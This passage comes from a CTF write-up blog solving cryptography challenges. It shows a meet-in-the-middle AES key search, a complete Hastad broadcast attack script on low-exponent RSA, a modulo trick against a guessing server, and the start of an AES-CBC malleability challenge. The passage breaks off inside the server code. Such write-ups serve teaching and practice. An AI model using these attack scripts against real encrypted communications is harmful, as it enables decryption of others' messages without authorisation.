</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k3</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k3b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([(</span><span class=n>k3</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>k3</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>key3</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k3b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key3</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>enc_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>table</span><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=o>=</span> <span class=n>k3b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k4</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k4b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([(</span><span class=n>k4</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>k4</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k4_last_byte</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k4b</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>!=</span> <span class=n>k4_last_byte</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>key4</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k4b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key4</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>quad_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>y</span> <span class=ow>in</span> <span class=n>table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>solutions</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>table</span><span class=p>[</span><span class=n>y</span><span class=p>],</span> <span class=n>k4b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>solutions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pretty_bytes</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Finding k1,k2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sol12</span> <span class=o>=</span> <span class=n>mitm_find_k1_k2</span><span class=p>(</span><span class=n>q_enc</span><span class=p>,</span> <span class=n>dec</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>sol12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] No (k1,k2) found.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=p>(</span><span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>)</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>sol12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;k1=</span><span class=si>{</span><span class=n>k1</span><span class=si>}</span><span class=s2> k2=</span><span class=si>{</span><span class=n>k2</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Finding k3,k4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sol34</span> <span class=o>=</span> <span class=n>mitm_find_k3_k4</span><span class=p>(</span><span class=n>enc</span><span class=p>,</span> <span class=n>q_enc</span><span class=p>,</span> <span class=n>k4_last_byte</span><span class=o>=</span><span class=nb>ord</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=p>(</span><span class=n>k3</span><span class=p>,</span> <span class=n>k4</span><span class=p>)</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>sol34</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;k3=</span><span class=si>{</span><span class=n>k3</span><span class=si>}</span><span class=s2> k4=</span><span class=si>{</span><span class=n>k4</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># combine keys and produce flag</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>)</span> <span class=ow>in</span> <span class=n>sol12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>key1</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>key2</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>aes1</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key1</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>aes2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key2</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>plaintext</span> <span class=o>=</span> <span class=n>aes1</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>aes2</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>enc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>plaintext</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>plaintext</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message (hex):&#34;</span><span class=p>,</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message (ascii):&#34;</span><span class=p>,</span> <span class=n>pretty_bytes</span><span class=p>(</span><span class=n>plaintext</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t decrypt enc with these keys.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>k3</span><span class=p>,</span> <span class=n>k4</span><span class=p>)</span> <span class=ow>in</span> <span class=n>sol34</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=p>(</span><span class=n>plaintext</span> <span class=ow>or</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span> <span class=o>+</span> <span class=n>k2</span> <span class=o>+</span> <span class=n>k3</span> <span class=o>+</span> <span class=n>k4</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;assembled flag: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># also print ascii if printable</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ascii:&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ascii: (non-printable bytes present)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=rsa-1-100>RSA-1 (100)</h3><blockquote><p>Y Tngy send a message to 3 peoples with unique modulus. But he left it vulnerable. Figure out :)</p></blockquote><p>We have a small e value (3) and several ciphertexts, this is vulnerable to <a href=https://xanhacks.gitlab.io/ctf-docs/crypto/rsa/08-hastad-broadcast-attack/>Hastad&rsquo;s Broadcast attack</a></p><p><strong>exploit.py :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>gcd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=mi>156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587</span>
</span></span><span class=line><span class=cl><span class=n>c1</span> <span class=o>=</span> <span class=mi>77845730447898247683281609913423107803974192483879771538601656664815266655476695261695401337124553851404038028413156487834500306455909128563474382527072827288203275942719998719612346322196694263967769165807133288612193509523277795556658877046100866328789163922952483990512216199556692553605487824176112568965</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>81176790394812943895417667822424503891538103661290067749746811244149927293880771403600643202454602366489650358459283710738177024118857784526124643798095463427793912529729517724613501628957072457149015941596656959113353794192041220905793823162933257702459236541137457227898063370534472564804125139395000655909</span>
</span></span><span class=line><span class=cl><span class=n>c2</span> <span class=o>=</span> <span class=mi>40787486105407063933087059717827107329565540104154871338902977389136976706405321232356479461501507502072366720712449240185342528262578445532244098369654742284814175079411915848114327880144883620517336793165329893295685773515696260299308407612535992098605156822281687718904414533480149775329948085800726089284</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>140612513823906625290578950857303904693579488575072876654320011261621692347864140784716666929156719735696270348892475443744858844360080415632704363751274666498790051438616664967359811895773995052063222050631573888071188619609300034534118393135291537302821893141204544943440866238800133993600817014789308510399</span>
</span></span><span class=line><span class=cl><span class=n>c3</span> <span class=o>=</span> <span class=mi>100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invmod</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=p>,</span> <span class=n>new_t</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=p>,</span> <span class=n>new_r</span> <span class=o>=</span> <span class=n>m</span><span class=p>,</span> <span class=n>a</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>new_r</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>q</span> <span class=o>=</span> <span class=n>r</span> <span class=o>//</span> <span class=n>new_r</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=p>,</span> <span class=n>new_t</span> <span class=o>=</span> <span class=n>new_t</span><span class=p>,</span> <span class=n>t</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>new_t</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=p>,</span> <span class=n>new_r</span> <span class=o>=</span> <span class=n>new_r</span><span class=p>,</span> <span class=n>r</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>new_r</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;non-invertible&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>t</span> <span class=o>%</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># CRT to get X = m^3</span>
</span></span><span class=line><span class=cl><span class=n>ns</span> <span class=o>=</span> <span class=p>[</span><span class=n>n1</span><span class=p>,</span> <span class=n>n2</span><span class=p>,</span> <span class=n>n3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>cs</span> <span class=o>=</span> <span class=p>[</span><span class=n>c1</span><span class=p>,</span> <span class=n>c2</span><span class=p>,</span> <span class=n>c3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=n>n1</span> <span class=o>*</span> <span class=n>n2</span> <span class=o>*</span> <span class=n>n3</span>
</span></span><span class=line><span class=cl><span class=n>Ms</span> <span class=o>=</span> <span class=p>[</span><span class=n>N</span> <span class=o>//</span> <span class=n>n</span> <span class=k>for</span> <span class=n>n</span> <span class=ow>in</span> <span class=n>ns</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>inv</span> <span class=o>=</span> <span class=p>[</span><span class=n>invmod</span><span class=p>(</span><span class=n>Ms</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>ns</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>X</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>cs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>Ms</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>inv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span> <span class=o>%</span> <span class=n>N</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Integer cube root (no floats)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>iroot3</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>lo</span><span class=p>,</span> <span class=n>hi</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>hi</span><span class=o>**</span><span class=mi>3</span> <span class=o>&lt;=</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>hi</span> <span class=o>&lt;&lt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>lo</span> <span class=o>&lt;</span> <span class=n>hi</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>lo</span> <span class=o>+</span> <span class=n>hi</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mid</span><span class=o>**</span><span class=mi>3</span> <span class=o>&lt;</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>lo</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>hi</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>lo</span> <span class=k>if</span> <span class=n>lo</span><span class=o>**</span><span class=mi>3</span> <span class=o>==</span> <span class=n>n</span> <span class=k>else</span> <span class=n>lo</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>iroot3</span><span class=p>(</span><span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Decode to bytes and strip PKCS#7 padding if present</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>m</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;0&#34;</span> <span class=o>+</span> <span class=n>h</span><span class=p>)</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>h</span><span class=p>)</span> <span class=o>%</span> <span class=mi>2</span> <span class=k>else</span> <span class=n>h</span>
</span></span><span class=line><span class=cl><span class=n>pt</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>pt</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>pad</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=ow>and</span> <span class=nb>all</span><span class=p>(</span><span class=n>b</span> <span class=o>==</span> <span class=n>pad</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>pt</span><span class=p>[</span><span class=o>-</span><span class=n>pad</span><span class=p>:]):</span>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>=</span> <span class=n>pt</span><span class=p>[:</span><span class=o>-</span><span class=n>pad</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>pt</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></div><h3 id=mod-285>Mod (285)</h3><blockquote><p>Just a simple modulo challenge</p></blockquote><p>In this challenge there&rsquo;s a random secret value stored in the server. It prompts us for a number and prints out <code>num % secret</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/local/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Welcome to Mod!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Provide a number: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>num</span> <span class=o>%</span> <span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>guess</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Guess: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>guess</span> <span class=o>==</span> <span class=n>secret</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Incorrect!&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Based on the output we have to guess the secret value. If we enter <code>-1</code> it will give us the value <code>secret - 1</code>. We just have to add 1 to it and send it back to the server.</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250819215155.webp></p><h3 id=eaas-484>EaaS (484)</h3><blockquote><p>Email as a Service! Have fun&mldr;</p></blockquote><p>This challenge can be solved for the fact that AES CBC encryption is vulnerable to <a href=https://en.wikipedia.org/wiki/Malleability_%28cryptography%29>malleability</a>. That is if we can generate a ciphertext for a plaintext of out choice, then we can make changes to the ciphertext which can be decrypted into predictable plaintext. It will be like modifying the plaintext without actually having access to the secret key.</p><p><strong>server.py :</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span><span class=p>,</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>email</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>has_flag</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>sent</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>encrypt</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>decrypt</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_email</span><span class=p>(</span><span class=n>recipient</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>has_flag</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>recipient</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;,&#34;</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>recipients</span> <span class=o>=</span> <span class=n>recipient</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;,&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>recipients</span> <span class=o>=</span> <span class=n>recipient</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>recipients</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=n>email</span><span class=o>.</span><span class=n>encode</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=n>has_flag</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>email</span> <span class=o>+=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=s2>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>email</span> <span class=o>+=</span> <span class=s2>&#34;@notscript.sorcerer&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Welcome to Email as a Service!</span><span class=se>\n</span><span class=s2>Your Email is: </span><span class=si>{</span><span class=n>email</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter secure password (in hex): &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=ow>not</span> <span class=nb>len</span><span class=p>(</span><span class=n>password</span><span class=p>)</span> <span class=o>%</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=sa>b</span><span class=s2>&#34;@script.sorcerer&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>password</span>
